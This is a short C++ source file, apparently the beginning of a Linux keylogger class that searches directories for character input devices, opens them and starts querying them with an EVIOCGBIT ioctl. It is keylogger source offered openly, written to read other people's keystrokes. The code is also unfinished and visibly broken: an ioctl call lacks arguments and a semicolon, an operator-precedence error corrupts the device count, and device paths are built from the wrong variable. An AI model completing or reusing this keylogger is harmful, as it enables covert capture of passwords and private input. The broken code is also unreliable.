#include "Keylogger.hpp"
#include <iostream>
#include <dirent.h>
#include <filesystem>
#include <sys/types.h>
#include <sys/ioctl.h>
#include <linux/input.h>
#include <sys/stat.h>
#include <fcntl.h>

static std::string singleton {""};

static int filter(const struct dirent *file){
    struct stat filestat;

    return stat(std::string{singleton + file->d_name}.c_str(), &filestat) ? 0 : S_ISCHR(filestat.st_mode);
}

kl::Keylogger::Keylogger(std::string output, bool debug, std::vector<std::string> inputDir)
    : _output(output), _debug(debug), _input("")
{
    std::cout << "DEBUG : {" << (debug ? "TRUE" : "FALSE") << "}" << std::endl;
    std::cout << "Starting program at " << std::filesystem::current_path().c_str() << std::endl;
    std::cout << "Output path : " << _output << std::endl;
    singleton = output;
    _findInputFile(inputDir);
}

void kl::Keylogger::_findInputFile(const std::vector<std::string> &dirList)
{
    ssize_t nb {0};
    ssize_t fd {0};
    struct dirent **files;
    std::string name;
    for (std::string dir : dirList)
    {
        if ((nb = scandir(dir.c_str(), &files, &filter, &alphasort) < 0))
            break;
        for (size_t i = 0; i < nb; i++) {
            name = _output + files[i]->d_name;
            if ((fd = open(name.c_str(), O_RDONLY)) == -1) {
                perror("open");
                continue;
            }
            ioctl(fd, EVIOCGBIT)
        }
    }
}